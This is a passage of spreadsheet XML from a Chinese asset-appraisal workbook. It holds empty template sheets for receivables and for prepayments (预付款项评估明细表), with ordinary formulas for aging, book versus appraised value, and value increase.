          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="380">
        <f>IF(E6="","",LOOKUP(DATEDIF(E6,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G6" s="185" t="n"/>
      <c r="H6" s="580" t="n"/>
      <c r="I6" s="588" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380">
        <f>IF(E7="","",LOOKUP(DATEDIF(E7,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="580" t="n"/>
      <c r="I7" s="588" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380">
        <f>IF(E8="","",LOOKUP(DATEDIF(E8,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="580" t="n"/>
      <c r="I8" s="588" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380">
        <f>IF(E9="","",LOOKUP(DATEDIF(E9,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="580" t="n"/>
      <c r="I9" s="588" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="380">
        <f>IF(E10="","",LOOKUP(DATEDIF(E10,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="580" t="n"/>
      <c r="I10" s="588" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="380">
        <f>IF(E11="","",LOOKUP(DATEDIF(E11,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="580" t="n"/>
      <c r="I11" s="588" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="380">
        <f>IF(E12="","",LOOKUP(DATEDIF(E12,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="580" t="n"/>
      <c r="I12" s="588" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="380">
        <f>IF(E13="","",LOOKUP(DATEDIF(E13,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="580" t="n"/>
      <c r="I13" s="588" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="380">
        <f>IF(E14="","",LOOKUP(DATEDIF(E14,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="580" t="n"/>
      <c r="I14" s="588" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="380">
        <f>IF(E15="","",LOOKUP(DATEDIF(E15,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="580" t="n"/>
      <c r="I15" s="588" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="380">
        <f>IF(E16="","",LOOKUP(DATEDIF(E16,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="580" t="n"/>
      <c r="I16" s="588" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="380">
        <f>IF(E17="","",LOOKUP(DATEDIF(E17,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="580" t="n"/>
      <c r="I17" s="588" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="380">
        <f>IF(E18="","",LOOKUP(DATEDIF(E18,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="580" t="n"/>
      <c r="I18" s="588" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="380">
        <f>IF(E19="","",LOOKUP(DATEDIF(E19,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="580" t="n"/>
      <c r="I19" s="588" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="380">
        <f>IF(E20="","",LOOKUP(DATEDIF(E20,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="580" t="n"/>
      <c r="I20" s="588" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="380">
        <f>IF(E21="","",LOOKUP(DATEDIF(E21,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="580" t="n"/>
      <c r="I21" s="588" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="380">
        <f>IF(E22="","",LOOKUP(DATEDIF(E22,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="580" t="n"/>
      <c r="I22" s="588" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="380">
        <f>IF(E23="","",LOOKUP(DATEDIF(E23,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="580" t="n"/>
      <c r="I23" s="588" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="380">
        <f>IF(E24="","",LOOKUP(DATEDIF(E24,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="580" t="n"/>
      <c r="I24" s="588" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="380">
        <f>IF(E25="","",LOOKUP(DATEDIF(E25,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="580" t="n"/>
      <c r="I25" s="588" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N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0" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="580">
        <f>ROUND(SUM(H6:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="555">
        <f>ROUND(SUM(J6:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>ROUND(SUM(K6:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>减：应收账款坏账准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>预计损失</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：应收账款预计损失</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="383" t="n"/>
      <c r="G29" s="383" t="n"/>
      <c r="H29" s="580">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I29" s="383" t="n"/>
      <c r="J29" s="555">
        <f>ROUND(J26-J27,2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>ROUND(K26-K28,2)</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>K29-J29</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>IF(J29=0,"",L29/J29*100)</f>
        <v/>
      </c>
      <c r="N29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B2:N2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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6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 codeName="Sheet22">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:T86"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="14.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col hidden="1" outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="7" max="9"/>
    <col collapsed="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="10.8333333333333" customWidth="1" style="410" min="13" max="13"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col width="9" customWidth="1" style="410" min="15" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>预付款项评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.8" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="O2" s="376" t="n"/>
      <c r="P2" s="376" t="n"/>
      <c r="Q2" s="376" t="n"/>
      <c r="R2" s="376" t="n"/>
      <c r="S2" s="376" t="n"/>
    </row>
    <row r="3" ht="17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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-7</t>
        </is>
      </c>
      <c r="O3" s="376" t="n"/>
      <c r="P3" s="376" t="n"/>
      <c r="Q3" s="376" t="n"/>
      <c r="R3" s="376" t="n"/>
      <c r="S3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.8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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="O4" s="376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="Q4" s="376" t="n"/>
      <c r="R4" s="376" t="n"/>
      <c r="S4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.8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收款单位名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>业务内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账龄</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="O5" s="344" t="n"/>
      <c r="P5" s="344" t="n"/>
      <c r="Q5" s="344" t="n"/>
      <c r="R5" s="344" t="n"/>
      <c r="S5" s="344" t="n"/>
      <c r="T5" s="337" t="n"/>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="380">
        <f>IF(E6="","",LOOKUP(DATEDIF(E6,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G6" s="185" t="n"/>
      <c r="H6" s="580" t="n"/>
      <c r="I6" s="589" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
      <c r="O6" s="347" t="n"/>
      <c r="P6" s="347" t="n"/>
      <c r="Q6" s="347" t="n"/>
      <c r="R6" s="347" t="n"/>
      <c r="S6" s="347" t="n"/>
      <c r="T6" s="322" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380">
        <f>IF(E7="","",LOOKUP(DATEDIF(E7,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="580" t="n"/>
      <c r="I7" s="589" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
      <c r="O7" s="347" t="n"/>
      <c r="P7" s="347" t="n"/>
      <c r="Q7" s="347" t="n"/>
      <c r="R7" s="347" t="n"/>
      <c r="S7" s="347" t="n"/>
      <c r="T7" s="322" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380">
        <f>IF(E8="","",LOOKUP(DATEDIF(E8,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="580" t="n"/>
      <c r="I8" s="589" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
      <c r="O8" s="347" t="n"/>
      <c r="P8" s="347" t="n"/>
      <c r="Q8" s="347" t="n"/>
      <c r="R8" s="347" t="n"/>
      <c r="S8" s="347" t="n"/>
      <c r="T8" s="322" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380">
        <f>IF(E9="","",LOOKUP(DATEDIF(E9,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="580" t="n"/>
      <c r="I9" s="589" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
      <c r="O9" s="347" t="n"/>
      <c r="P9" s="347" t="n"/>
      <c r="Q9" s="347" t="n"/>
      <c r="R9" s="347" t="n"/>
      <c r="S9" s="347" t="n"/>
      <c r="T9" s="322" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
